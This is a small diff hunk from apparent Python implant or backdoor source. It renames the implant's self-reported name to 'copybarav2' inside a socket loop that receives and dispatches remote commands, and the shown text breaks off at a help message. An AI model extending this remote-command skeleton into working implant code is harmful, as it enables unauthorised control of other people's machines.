@@ -8,7 +8,7 @@ def connect():
     while True:
         command = s.recv(1024).decode("utf-8")
         if command == "info":
-            s.send("implantname help command1 command2 command3".encode("utf-8"))
+            s.send("copybarav2 help command1 command2 command3".encode("utf-8"))
         elif command == "help":
             help_text = """Available commands:\n"
 					  help - Display this help message\n"
